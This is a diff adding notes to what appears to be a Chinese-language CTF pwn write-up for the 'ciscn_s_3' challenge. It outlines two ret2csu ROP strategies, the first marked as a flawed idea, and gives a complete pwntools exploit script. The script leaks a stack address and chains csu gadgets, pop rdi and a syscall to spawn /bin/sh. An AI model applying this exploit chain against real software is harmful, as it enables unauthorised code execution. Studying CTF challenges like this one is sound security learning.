@@ -378,6 +378,83 @@ io.interactive()
 
 ```
 
+* ret2csu1（思路错误，ret2csu只能控制edi，站上地址四位无法表示，故无法使使得rdi指向栈上/bin/sh）
+  * 在栈上写入/bin/sh和syscall的地址，需要泄露地址
+  * ret2 函数返回值为0x3b
+  * ret2csu设置前三个寄存器，设置r12+rbx*8指向buf上的syscall地址
+  * call syscall执行
+* ret2csu2
+  * 在栈上写入/bin/sh的地址，需要泄露地址
+  * ret2 write再次写入pop rdi;ret的地址
+  * ret2 函数返回值为0x3b
+  * ret2csu设置rsi rdx，设置r12+rbx*8指向buf上的pop rdi;ret地址
+  * pop出call push进的地址
+  * ret到pop rdi;ret 
+  * pop rdi
+  * ret 到syscall执行
+
+```python
+from pwn import *
+
+context(log_level='debug',arch='amd64', os='linux')
+elfpath = '/home/lideao/C/ciscn_s_3'
+context.binary = elfpath
+context.terminal = ['tmux', 'splitw', '-h']
+io=process()
+elf = ELF(elfpath)
+rop=ROP(elfpath) 
+# io=gdb.debug(elfpath,'''
+#     b main
+#     b *0x400519
+#     c
+# ''')
+
+write_addr = 0x4004f1
+
+payload1 = flat(
+    {0x00:b'/bin/sh\x00',
+    ( 0x7fffffffe380-0x7fffffffe370) : write_addr}
+)
+io.send(payload1)
+recv=io.recv()[32:40]
+print(b"addr:"+recv)
+stack_addr = u64(recv)
+bin_sh_addr = stack_addr - 0x128
+ret_buf_addr = stack_addr - 0x120
+
+ret_addr = rop.rdi.address  # call的地址，先将push进去的rip给pop掉，后面再pop rdi
+gadget_addr=0x4004E2
+csu1_addr=0x40059A
+rbx=0x00
+rbp=0x00
+r12=ret_buf_addr
+r13_rdx=0x00
+r14_rsi=0x00
+r15d_edi=bin_sh_addr # 后面覆盖
+csu2_addr=0x400580
+syscall_addr = 0x400517
+pop_rdi_addr=rop.rdi.address
+
+payload2 = flat(
+    {0x00:ret_addr,0x10:gadget_addr},
+    [csu1_addr,
+    rbx,
+    rbp,
+    r12,
+    r13_rdx,
+    r14_rsi,
+    r15d_edi,
+    csu2_addr,
+    pop_rdi_addr,
+    bin_sh_addr,
+    syscall_addr]
+)
+pause()
+io.send(payload2)
+io.interactive()
+
+```
+
 
 
  
